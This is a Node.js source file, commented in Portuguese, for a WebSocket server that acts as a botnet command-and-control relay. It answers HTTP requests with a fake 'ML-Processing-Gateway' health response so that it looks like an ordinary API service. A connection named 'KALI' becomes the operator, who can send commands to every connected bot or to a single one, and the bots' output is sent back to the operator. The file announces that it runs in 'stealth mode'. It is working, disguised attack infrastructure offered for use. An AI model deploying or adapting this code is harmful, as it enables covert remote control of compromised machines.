const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    // Página fake para parecer um serviço de API comum
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: "healthy", version: "2.0.4", service: "ML-Processing-Gateway" }));
});

const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(req.url.split('?')[1]);
    const id = params.get('id');

    if (id === 'KALI') {
        if (KALI) KALI.terminate();
        KALI = ws;
        console.log('[+] Orquestrador Kali Conectado');
    } else if (id) {
        BOTS.set(id, ws);
        console.log(`[+] Novo nó de processamento: ${id}`);
        // Notifica o Kali sobre o novo trabalhador disponível
        if (KALI && KALI.readyState === WebSocket.OPEN) {
            KALI.send(JSON.stringify({ t: 'sys', msg: 'new_worker', bot: id }));
        }
    }

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            // Se a mensagem vem do KALI
            if (ws === KALI) {
                if (data.to === 'ALL') {
                    // Envio em massa (Broadcast)
                    BOTS.forEach(bot => bot.send(data.cmd));
                } else {
                    // Envio direcionado
                    const target = BOTS.get(data.to);
                    if (target) target.send(data.cmd);
                }
            } 
            // Se a mensagem vem de um BOT (Resultado do processamento)
            else {
                if (KALI && KALI.readyState === WebSocket.OPEN) {
                    // Encaminha o resultado para o Kali
                    KALI.send(JSON.stringify({ t: 'res', f: id, d: data }));
                }
            }
        } catch (e) {
            // Fallback para mensagens não-JSON
            if (ws !== KALI && KALI) {
                KALI.send(JSON.stringify({ t: 'raw', f: id, d: message.toString() }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
        } else {
            BOTS.delete(id);
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'sys', msg: 'worker_lost', bot: id }));
            }
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Gateway rodando em stealth mode na porta ${PORT}`));
